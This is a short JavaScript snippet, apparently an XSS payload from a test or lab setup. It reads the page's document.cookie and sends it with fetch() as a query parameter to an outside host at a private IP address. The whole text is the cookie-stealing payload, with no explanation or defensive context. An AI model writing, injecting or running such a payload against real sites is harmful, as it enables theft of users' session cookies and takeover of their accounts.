token = document.cookie
url = "http://192.168.40.131:8086/prueba.txt?token="+token
fetch(url, {
    method: 'GET'
})
.then((res) => res.text())
.then((data) => {
});
